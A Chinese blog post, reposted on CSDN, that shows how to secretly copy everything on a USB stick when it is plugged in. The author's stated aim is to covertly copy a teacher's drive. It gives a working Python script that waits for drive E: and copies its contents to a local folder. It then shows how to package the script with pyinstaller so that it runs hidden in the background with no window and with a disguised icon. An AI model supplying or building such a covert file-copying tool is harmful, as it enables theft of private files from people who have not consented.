# 用几行python代码偷偷复制U盘文件 - zhusongziye的博客 - CSDN博客





2018年11月26日 19:30:03[zhusongziye](https://me.csdn.net/zhusongziye)阅读数：103








## 前言

上大学的时候有老师不给上课的PPT，就总想有个程序能偷偷复制老师的U盘。。。。一直没有去实现，最近不想看论文，就想起来这个事情了，发现其实用几行python代码就能搞定了。分两步，首先写出来python代码，其次把.py文件转换成exe文件，直接在windows电脑上后台运行。

## 代码

```
# -*- coding:utf-8 -*-
import os
import time
from datetime import datetime
import shutil

# U盘的盘符
usb_path = "E:/"
# 要复制到的路径
save_path = "D:/haha"

while (True):
    if os.path.exists(usb_path):
        shutil.copytree(usb_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))
        break
    else:
        time.sleep(10)
```

上面就是所有的代码，代码有两个地方要改成你自己的路径，我在代码里注释了
- 
usb_path就是U盘的盘符，比如你的电脑有C,D盘，那么U盘插上来以后路径就是E盘

- 
save_path就是你要把复制的文件保存在哪里


## Python文件打包成exe

**1. 在命令行用pip安装 pyinstaller包**

```
pip install pyinstaller
```

**2.下载安装pyinstaler运行时所需要的windows扩展pywin32**

`mhammond/pywin32`

选择最新版的下载，注意要选择对应的python版本(version)和python位数(bittedness)

通过在命令行输入python查看python版本和位数

如下所示为python3.6的32位，需要下载`[pywin32-223.win32-py3.6.exe]`

```
Python 3.6.3 ... [MSC v.1900 32 bit (Intel)] on win32
```

如下所示为python3.6的64位，需要下载`[pywin32-223.win-amd64-py3.6.exe]`

```
Python 3.6.3 ... [MSC v.1900 64 bit (AMD64)] on win32
```

**3.在命令行中直接输入下面的指令即可**

```
pyinstaller [opts] yourprogram.py
```

**参数含义**

-F    指定打包后只生成一个exe格式的文件(建议写上这个参数)

-D    –onedir 创建一个目录，包含exe文件，但会依赖很多文件（默认选项）

-c    –console, –nowindowed 使用控制台，无界面(默认)

-w    –windowed, –noconsole 使用窗口，无控制台

-p    添加搜索路径，让其找到对应的库。

-i    改变生成程序的icon图标(比如给女朋友写的程序，换个好看的图标，默认的很丑)

## 实例说明

比如你有个python程序叫`test.py`，绝对路径在`[D:\project]`，打包成一个exe格式的文件

```
pyinstaller -F D:\project\test.py
```

条件同上，如果还希望没有控制台的黑框框，在进程中偷偷运行

```
pyinstaller -F -w D:\project\test.py
```

条件同上，如果还希望更换程序图标

```
pyinstaller -F -w -i D:\project\test.ico D:\project\test.py
```

## 运行程序

最后双击打开生成的exe文件，你看不到界面，但是可以在任务管理器的后台进程中找到，当有U盘插入，就会自动复制到你设定的地址，然后进程就会自动关闭。

![](https://img-blog.csdnimg.cn/20181124155542164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll,size_16,color_FFFFFF,t_70)

```
作者：王先生
源自：https://zhuanlan.zhihu.com/p/38673066
```



